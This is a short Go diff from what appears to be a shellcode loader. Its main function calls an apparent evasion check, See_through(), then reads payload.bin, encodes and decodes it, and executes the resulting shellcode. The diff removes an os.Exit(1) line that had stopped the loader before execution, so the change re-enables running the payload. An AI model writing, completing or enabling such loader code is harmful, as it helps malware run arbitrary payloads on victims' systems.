@@ -156,6 +156,5 @@ func main() {
 	See_through()
 	Encode := Encode(string(read("./payload.bin")))
 	shellCodeHex := Dencode(Encode)
-	os.Exit(1)
 	exec(shellCodeHex)
 }
